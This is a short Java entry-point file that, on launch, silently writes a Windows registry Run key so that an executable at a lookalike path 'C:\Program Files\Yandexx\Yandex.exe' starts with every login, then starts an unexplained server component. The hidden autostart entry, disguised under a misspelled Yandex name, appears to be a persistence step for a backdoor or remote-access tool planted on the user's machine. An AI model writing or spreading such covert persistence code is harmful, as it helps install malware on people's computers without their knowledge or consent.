package ru.at0m1cc;

import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.io.IOException;

public class Main {
    public static void main(String[] args) {
        try {
            Runtime.getRuntime().exec("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v 1 /t REG_SZ /d \"C:\\Program Files\\Yandexx\\Yandex.exe\"");
            ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("applicationContext.xml");
            ServerLogic serv = (ServerLogic) context.getBean("serverLogic");
            serv.start();
        } catch (IOException e) {
            ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("applicationContext.xml");
            ServerLogic serv = (ServerLogic) context.getBean("serverLogic");
            serv.start();
        }
    }
}